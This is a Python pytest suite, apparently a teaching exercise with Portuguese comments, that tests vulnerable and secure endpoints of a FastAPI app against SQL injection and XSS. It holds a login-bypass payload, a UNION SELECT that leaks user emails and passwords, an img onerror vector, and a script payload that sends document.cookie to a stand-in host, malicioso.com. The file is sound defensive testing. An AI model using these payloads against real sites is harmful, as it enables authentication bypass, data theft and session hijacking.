"""
Suíte de testes ofensivos e defensivos para validação de SQL Injection e XSS.
"""

import pytest
from fastapi.testclient import TestClient
from main import app

cliente = TestClient(app)


# ==============================================================================
# AUDITORIA OFENSIVA: PROVANDO AS VULNERABILIDADES NO ENDPOINT INSEGURO
# ==============================================================================

@pytest.mark.security
def test_deve_comprovar_vulnerabilidade_de_sql_injection():
    """
    Comprova que a rota vulneravel permite burlar a autenticacao
    e logar como administrador sem conhecer a senha.
    """
    # ARRANGE: Payload ofensivo clássico de subversão de cláusula WHERE
    payload_malicioso = {
        "email": "admin@hubsolidario.org' --",
        "senha": "senha_completamente_incorreta"
    }

    # ACT: Disparo da requisição maliciosa
    resposta = cliente.post("/vulneravel/login", json=payload_malicioso)

    # ASSERT: O endpoint vulnerável autentica indevidamente o invasor
    assert resposta.status_code == 200
    dados = resposta.json()
    assert dados["email"] == "admin@hubsolidario.org"
    assert dados["is_admin"] is True


@pytest.mark.security
def test_deve_comprovar_vulnerabilidade_de_xss():
    """
    Comprova que a rota vulneravel aceita tags de script executaveis sem escapar.
    """
    # ARRANGE: Payload malicioso de Cross-Site Scripting
    payload_xss = {
        "autor": "Atacante",
        "conteudo": "<script>fetch('http://malicioso.com?cookie=' + document.cookie)</script>"
    }

    # ACT: Envio do comentário
    resposta = cliente.post("/vulneravel/comentarios", json=payload_xss)

    # ASSERT: O endpoint vulnerável devolveu a tag <script> intacta
    assert resposta.status_code == 200
    assert "<script>" in resposta.json()["conteudo"]


# ==============================================================================
# AUDITORIA DEFENSIVA: COMPROVANDO A EFICÁCIA DA MITIGAÇÃO NO ENDPOINT SEGURO
# ==============================================================================

@pytest.mark.security
def test_endpoint_seguro_deve_bloquear_sql_injection():
    """
    Comprova que a rota segura barra a tentativa de SQL Injection
    retornando status HTTP 401 Unauthorized.
    """
    # ARRANGE
    payload_malicioso = {
        "email": "admin@hubsolidario.org' --",
        "senha": "senha_completamente_incorreta"
    }

    # ACT
    resposta = cliente.post("/seguro/login", json=payload_malicioso)

    # ASSERT
    assert resposta.status_code == 401
    assert resposta.json()["detail"] == "Credenciais invalidas"


@pytest.mark.security
def test_endpoint_seguro_deve_sanitizar_tags_xss():
    """
    Comprova que a rota segura sanitiza caracteres perigosos,
    convertendo tags executáveis em entidades HTML inofensivas.
    """
    # ARRANGE
    payload_xss = {
        "autor": "Atacante",
        "conteudo": "<script>alert('Ataque XSS')</script>"
    }

    # ACT
    resposta = cliente.post("/seguro/comentarios", json=payload_xss)

    # ASSERT
    assert resposta.status_code == 200
    conteudo_retornado = resposta.json()["conteudo"]
    assert "<script>" not in conteudo_retornado
    assert "&lt;script&gt;" in conteudo_retornado


# ==============================================================================
# EXERCICIO 1: SQL INJECTION VIA UNION SELECT (EXTRACAO DE DADOS)
# ==============================================================================

@pytest.mark.security
def test_deve_comprovar_sql_injection_union_select():
    """
    Comprova que a rota de busca vulneravel permite extrair, via UNION SELECT,
    o email e a senha dos usuarios — dados de uma tabela que nao deveria ser
    acessivel pela busca de campanhas.
    """
    # ARRANGE: o UNION precisa casar o numero de colunas (id, titulo, meta = 3).
    # Fechamos o LIKE com "' " e comentamos o restante com "--".
    payload_union = "' UNION SELECT id, email, senha FROM usuarios --"

    # ACT
    resposta = cliente.get(
        "/vulneravel/campanhas/buscar",
        params={"termo": payload_union}
    )

    # ASSERT: a resposta vaza credenciais da tabela usuarios
    assert resposta.status_code == 200
    titulos_vazados = [item["titulo"] for item in resposta.json()["resultados"]]
    senhas_vazadas = [item["meta"] for item in resposta.json()["resultados"]]
    assert "admin@hubsolidario.org" in titulos_vazados
    assert "segredo_admin_123" in senhas_vazadas


@pytest.mark.security
def test_endpoint_seguro_deve_bloquear_union_select():
    """
    Comprova que a rota de busca segura trata o payload UNION como texto
    literal: nenhuma credencial vaza e a busca simplesmente nao encontra
    nenhuma campanha com aquele titulo.
    """
    # ARRANGE
    payload_union = "' UNION SELECT id, email, senha FROM usuarios --"

    # ACT
    resposta = cliente.get(
        "/seguro/campanhas/buscar",
        params={"termo": payload_union}
    )

    # ASSERT
    assert resposta.status_code == 200
    resultados = resposta.json()["resultados"]
    assert resultados == []


# ==============================================================================
# EXERCICIO 2: XSS EM ATRIBUTO HTML VIA onerror (BURLANDO FILTRO DE 'script')
# ==============================================================================

@pytest.mark.security
def test_deve_comprovar_xss_via_onerror_sem_tag_script():
    """
    Demonstra que um filtro ingenuo que apenas remove a palavra 'script'
    nao protege contra XSS: a tag <img> com o atributo onerror executa
    JavaScript sem conter a palavra 'script'.
    """
    # ARRANGE: vetor baseado em imagem — nao ha a palavra "script" no payload
    payload_onerror = {
        "autor": "Atacante",
        "conteudo": "<img src=x onerror=alert('XSS')>"
    }

    # ACT
    resposta = cliente.post("/vulneravel/comentarios", json=payload_onerror)

    # ASSERT: a rota vulneravel devolve o vetor intacto e executavel
    assert resposta.status_code == 200
    conteudo = resposta.json()["conteudo"]
    assert "onerror=" in conteudo
    assert "<img" in conteudo


@pytest.mark.security
def test_endpoint_seguro_deve_neutralizar_xss_via_onerror():
    """
    Comprova que a sanitizacao com html.escape() neutraliza o vetor <img onerror>,
    convertendo os sinais de menor/maior em entidades HTML inofensivas.
    A defesa correta escapa a marcacao inteira, em vez de filtrar palavras.
    """
    # ARRANGE
    payload_onerror = {
        "autor": "Atacante",
        "conteudo": "<img src=x onerror=alert('XSS')>"
    }

    # ACT
    resposta = cliente.post("/seguro/comentarios", json=payload_onerror)

    # ASSERT
    assert resposta.status_code == 200
    conteudo = resposta.json()["conteudo"]
    assert "<img" not in conteudo
    assert "&lt;img" in conteudo
